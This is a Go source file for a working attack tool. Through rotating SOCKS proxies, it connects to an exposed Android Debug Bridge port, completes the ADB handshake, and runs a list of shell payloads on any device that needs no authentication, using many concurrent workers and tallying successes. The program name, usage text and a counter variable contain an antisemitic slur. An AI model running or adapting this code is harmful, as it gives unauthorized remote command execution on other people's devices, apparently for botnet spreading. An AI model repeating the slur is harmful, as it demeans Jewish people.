package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	_ "github.com/bdandy/go-socks4"
	"golang.org/x/net/proxy"
)

const (
	connTimeout    = 40 * time.Second
	defaultMaxData = 4096
	adbVersion     = 0x01000000
)

var (
	debug        bool
	debugFull    bool
	showOutput   bool
	tried        uint64
	connected    uint64
	executed     uint64
	failed       uint64
	authRequired uint64
	sorrowJewed  uint64
	proxyIndex   uint32
)

type AdbMessage struct {
	Command uint32
	Arg0    uint32
	Arg1    uint32
	Length  uint32
	CRC32   uint32
	Magic   uint32
	Payload []byte
}

const (
	A_CNXN = 0x4e584e43
	A_AUTH = 0x48545541
	A_OPEN = 0x4e45504f
	A_OKAY = 0x59414b4f
	A_CLSE = 0x45534c43
	A_WRTE = 0x45545257
)

func debugf(format string, v ...interface{}) {
	if debug {
		log.Printf(format, v...)
	}
}

func printUsage() {
	fmt.Println("Usage: ./jew <ip> <port> [options]")
	fmt.Println("Options:")
	fmt.Println("  -j, --threads <int>   how many threads u wanna run?")
	fmt.Println("  -d, --debug           debug logging (kinda useless if u ask me)")
	fmt.Println("  -f, --debug-full      ignore magic mismatch and dump raw response")
	fmt.Println("  -o, --output          show command output (idk why u would want ts)")
	fmt.Println("  -r, --restart <int>   restart workers every X seconds")
}

func main() {
	flagSet := flag.NewFlagSet("jew", flag.ExitOnError)
	threads := flagSet.Int("j", 100, "Number of concurrent workers")
	flagSet.IntVar(threads, "threads", 100, "Number of concurrent workers")
	flagSet.BoolVar(&debug, "d", false, "Enable debug logging")
	flagSet.BoolVar(&debug, "debug", false, "Enable debug logging")
	flagSet.BoolVar(&debugFull, "f", false, "Ignore magic mismatch and dump response")
	flagSet.BoolVar(&debugFull, "debug-full", false, "Ignore magic mismatch and dump response")
	flagSet.BoolVar(&showOutput, "o", false, "Show command output")
	flagSet.BoolVar(&showOutput, "output", false, "Show command output")
	restartSecs := flagSet.Int("r", 0, "Restart interval in seconds")
	flagSet.IntVar(restartSecs, "restart", 0, "Restart interval in seconds")

	var positional []string
	var flagArgs []string
	for i := 1; i < len(os.Args); i++ {
		arg := os.Args[i]
		if strings.HasPrefix(arg, "-") {
			flagArgs = append(flagArgs, arg)
			if (arg == "-j" || arg == "--threads" || arg == "-r" || arg == "--restart") && i+1 < len(os.Args) {
				flagArgs = append(flagArgs, os.Args[i+1])
				i++
			}
		} else {
			positional = append(positional, arg)
		}
	}

	flagSet.Parse(flagArgs)

	if debugFull {
		debug = true
	}

	if debug {
		log.Println("[!] Debug mode enabled")
		if debugFull {
			log.Println("[!] FULL response dumping enabled (-f)")
		}
	}

	if len(positional) < 2 {
		printUsage()
		os.Exit(1)
	}

	target := positional[0]
	port := positional[1]

	log.Printf("[+] Starting on %s:%s with %d threads", target, port, *threads)

	proxiesFile := "proxies.txt"
	payloadsFile := "payloads.txt"

	proxies, err := readLines(proxiesFile)
	if err != nil {
		log.Fatalf("Failed to read proxies from %s: %v", proxiesFile, err)
	}
	if len(proxies) == 0 {
		log.Fatalf("No proxies found in %s", proxiesFile)
	}

	payloads, err := readLines(payloadsFile)
	if err != nil {
		log.Fatalf("Failed to read payloads from %s: %v", payloadsFile, err)
	}
	if len(payloads) == 0 {
		log.Fatalf("No payloads found in %s", payloadsFile)
	}

	jobs := make(chan struct{}, 5000)

	go func() {
		for {
			time.Sleep(1 * time.Second)
			fmt.Printf("| Tried: %d | Connected: %d | Auth Required: %d | Executed: %d | Failed: %d | Reaver: %d\n",
				atomic.LoadUint64(&tried),
				atomic.LoadUint64(&connected),
				atomic.LoadUint64(&authRequired),
				atomic.LoadUint64(&executed),
				atomic.LoadUint64(&failed),
				atomic.LoadUint64(&sorrowJewed))
		}
	}()

	go func() {
		minJobs := 10 * (*threads)
		for {
			if len(jobs) < minJobs {
				for i := 0; i < *threads; i++ {
					jobs <- struct{}{}
				}
			}
			time.Sleep(10 * time.Millisecond)
		}
	}()

	for {
		ctx, cancel := context.WithCancel(context.Background())

		currentProxies, _ := readLines(proxiesFile)
		currentPayloads, _ := readLines(payloadsFile)
		if len(currentProxies) == 0 {
			currentProxies = proxies
		}
		if len(currentPayloads) == 0 {
			currentPayloads = payloads
		}

		log.Printf("[+] Launching %d workers (Restart: %d seconds)", *threads, *restartSecs)

		var workerWg sync.WaitGroup
		for i := 0; i < *threads; i++ {
			workerWg.Add(1)
			go worker(ctx, &workerWg, jobs, currentProxies, currentPayloads, target, port)
		}

		if *restartSecs > 0 {
			time.Sleep(time.Duration(*restartSecs) * time.Second)
			log.Println("[!] Restart interval reached. Launching new batch...")
			cancel()
			go func(w *sync.WaitGroup) { w.Wait() }(&workerWg)
		} else {
			select {}
		}
	}
}

func worker(ctx context.Context, wg *sync.WaitGroup, jobs <-chan struct{}, proxies, payloads []string, target, port string) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		select {
		case <-ctx.Done():
			return
		case <-jobs:
			atomic.AddUint64(&tried, 1)
			pIndex := atomic.AddUint32(&proxyIndex, 1) % uint32(len(proxies))
			proxyStr := proxies[pIndex]

			if strings.Contains(proxyStr, "-res-any") {
				if idx := strings.Index(proxyStr, ":"); idx != -1 {
					user := proxyStr[:idx]
					if !strings.Contains(user, "-session-") {
						sessionID := randomString(5)
						proxyStr = user + "-session-" + sessionID + proxyStr[idx:]
					}
				}
			}

			debugf("[+] Testing target: %s:%s via proxy %s", target, port, proxyStr)
			exploitTarget(ctx, target, proxyStr, port, payloads)
		}
	}
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	ret := make([]byte, n)
	for i := range ret {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		ret[i] = letters[num.Int64()]
	}
	return string(ret)
}

func exploitTarget(ctx context.Context, target, proxyAddr, port string, payloads []string) {
	proxyHost := proxyAddr
	if idx := strings.LastIndex(proxyAddr, "@"); idx != -1 {
		proxyHost = proxyAddr[idx+1:]
	}

	dialer, err := newSocksDialer(ctx, proxyAddr, connTimeout)
	if err != nil {
		debugf("[-] [%s] SOCKS Config Error (Proxy: %s): %v", target, proxyHost, err)
		atomic.AddUint64(&failed, 1)
		return
	}

	var conn net.Conn
	if cDialer, ok := dialer.(proxy.ContextDialer); ok {
		conn, err = cDialer.DialContext(ctx, "tcp", fmt.Sprintf("%s:%s", target, port))
	} else {
		conn, err = dialer.Dial("tcp", fmt.Sprintf("%s:%s", target, port))
	}

	if err != nil {
		errStr := err.Error()
		reason := "Unknown Error"
		if strings.Contains(errStr, "EOF") {
			reason = "Proxy hung up (EOF) - Likely rejected target IP"
		} else if strings.Contains(errStr, "timeout") {
			reason = "Connection timed out"
		} else if strings.Contains(errStr, "connection refused") {
			reason = "Target refused connection"
		} else if strings.Contains(errStr, "authentication failed") {
			reason = "Proxy auth failed"
		} else if strings.Contains(errStr, "socks connect") {
			reason = "SOCKS handshake failed"
		} else {
			reason = errStr
		}

		debugf("[-] [%s] Proxy Error (%s): %s", target, proxyHost, reason)
		atomic.AddUint64(&failed, 1)
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			conn.Close()
		case <-done:
		}
	}()
	defer close(done)

	debugf("[+] [%s] Connected. Sending CNXN.", target)

	cnxnPayload := []byte("host::\x00")
	err = writeMessage(conn, A_CNXN, adbVersion, defaultMaxData, cnxnPayload)
	if err != nil {
		debugf("[-] [%s] Failed to send CNXN: %v", target, err)
		atomic.AddUint64(&failed, 1)
		return
	}

	msg, err := readMessage(conn)
	if err != nil {
		debugf("[-] [%s] Failed to read CNXN response: %v", target, err)
		atomic.AddUint64(&failed, 1)
		return
	}

	switch msg.Command {
	case A_AUTH:
		debugf("[+] [%s] ADB requires authentication.", target)
		atomic.AddUint64(&authRequired, 1)
		return
	case A_CNXN:
		atomic.AddUint64(&connected, 1)
		debugf("[+] [%s] ADB Connection successful.", target)
		for _, payload := range payloads {
			runShellCommand(ctx, conn, target, payload)
		}
	default:
		debugf("[-] [%s] Unexpected response to CNXN: %s", target, hex.EncodeToString(msg.Payload))
		atomic.AddUint64(&failed, 1)
		return
	}
}

func runShellCommand(ctx context.Context, conn net.Conn, target, command string) {
	localID := uint32(1)

	conn.SetDeadline(time.Now().Add(1 * time.Minute))
	defer conn.SetDeadline(time.Time{})

	openPayload := []byte(fmt.Sprintf("shell:%s\x00", command))
	err := writeMessage(conn, A_OPEN, localID, 0, openPayload)
	if err != nil {
		debugf("[-] [%s] Failed to send OPEN: %v", target, err)
		atomic.AddUint64(&failed, 1)
		return
	}

	executedCmd := false
	for {
		msg, err := readMessage(conn)
		if err != nil {
			debugf("[-] [%s] Error reading message: %v", target, err)
			atomic.AddUint64(&failed, 1)
			return
		}

		switch msg.Command {
		case A_OKAY:
			continue
		case A_WRTE:
			if showOutput {
				fmt.Printf("[output] [%s]: %s", target, string(msg.Payload))
			}
			if strings.Contains(string(msg.Payload), "Killed") {
				atomic.AddUint64(&sorrowJewed, 1)
			}
		case A_CLSE:
			if !executedCmd {
				atomic.AddUint64(&executed, 1)
				executedCmd = true
			}
			debugf("[+] [%s] Command finished.", target)
			return
		default:
			debugf("[-] [%s] Unexpected message type: %08x", target, msg.Command)
			atomic.AddUint64(&failed, 1)
			return
		}
	}
}

func writeMessage(w io.Writer, command, arg0, arg1 uint32, payload []byte) error {
	msg := AdbMessage{
		Command: command,
		Arg0:    arg0,
		Arg1:    arg1,
		Length:  uint32(len(payload)),
		Magic:   command ^ 0xFFFFFFFF,
		Payload: payload,
	}

	err := binary.Write(w, binary.LittleEndian, &msg.Command)
	if err != nil {
		return err
	}
	err = binary.Write(w, binary.LittleEndian, &msg.Arg0)
	if err != nil {
		return err
	}
	err = binary.Write(w, binary.LittleEndian, &msg.Arg1)
	if err != nil {
		return err
	}
	err = binary.Write(w, binary.LittleEndian, &msg.Length)
	if err != nil {
		return err
	}

	var checksum uint32
	for _, b := range payload {
		checksum += uint32(b)
	}
	err = binary.Write(w, binary.LittleEndian, &checksum)
	if err != nil {
		return err
	}

	err = binary.Write(w, binary.LittleEndian, &msg.Magic)
	if err != nil {
		return err
	}

	if len(payload) > 0 {
		_, err = w.Write(payload)
		if err != nil {
			return err
		}
	}

	return nil
}

func readMessage(r io.Reader) (*AdbMessage, error) {
	var msg AdbMessage
	header := make([]byte, 24)
	if _, err := io.ReadFull(r, header); err != nil {
		return nil, err
	}

	msg.Command = binary.LittleEndian.Uint32(header[0:4])
	msg.Arg0 = binary.LittleEndian.Uint32(header[4:8])
	msg.Arg1 = binary.LittleEndian.Uint32(header[8:12])
	msg.Length = binary.LittleEndian.Uint32(header[12:16])
	msg.CRC32 = binary.LittleEndian.Uint32(header[16:20])
	msg.Magic = binary.LittleEndian.Uint32(header[20:24])

	if msg.Command != (msg.Magic ^ 0xFFFFFFFF) {
		if debugFull {
			debugf("DEBUG: Magic mismatch: cmd=%08x magic=%08x (Header: %s | ASCII: %s)", msg.Command, msg.Magic, hex.EncodeToString(header), printable(header))
		} else {
			return nil, fmt.Errorf("magic mismatch: cmd=%08x magic=%08x", msg.Command, msg.Magic)
		}
	}

	if msg.Length > 0 {
		if debugFull && msg.Length > 65536 {
			debugf("DEBUG: Capping suspicious length %d to 4096", msg.Length)
			msg.Length = 4096
		}
		msg.Payload = make([]byte, msg.Length)
		if _, err := io.ReadFull(r, msg.Payload); err != nil {
			return nil, err
		}

		var checksum uint32
		for _, b := range msg.Payload {
			checksum += uint32(b)
		}
		if checksum != msg.CRC32 {
			debugf("Checksum mismatch: expected %d, got %d", msg.CRC32, checksum)
		}
	}

	return &msg, nil
}

func newSocksDialer(ctx context.Context, proxyAddr string, timeout time.Duration) (proxy.Dialer, error) {
	scheme := "socks5"
	if strings.HasPrefix(proxyAddr, "socks4://") {
		scheme = "socks4"
	} else if strings.HasPrefix(proxyAddr, "socks4a://") {
		scheme = "socks4a"
	} else if strings.HasPrefix(proxyAddr, "socks5://") {
		scheme = "socks5"
	}

	proxyURL, err := url.Parse(fmt.Sprintf("%s://%s", scheme, strings.TrimPrefix(strings.TrimPrefix(strings.TrimPrefix(proxyAddr, "socks4://"), "socks4a://"), "socks5://")))
	if err != nil {
		return nil, err
	}

	dialer, err := proxy.FromURL(proxyURL, &net.Dialer{Timeout: timeout})
	if err != nil {
		return nil, err
	}

	return dialer, nil
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func hexDump(data []byte) string {
	return hex.EncodeToString(data)
}

func printable(data []byte) string {
	res := make([]byte, len(data))
	for i, b := range data {
		if b >= 32 && b <= 126 {
			res[i] = b
		} else {
			res[i] = '.'
		}
	}
	return string(res)
}
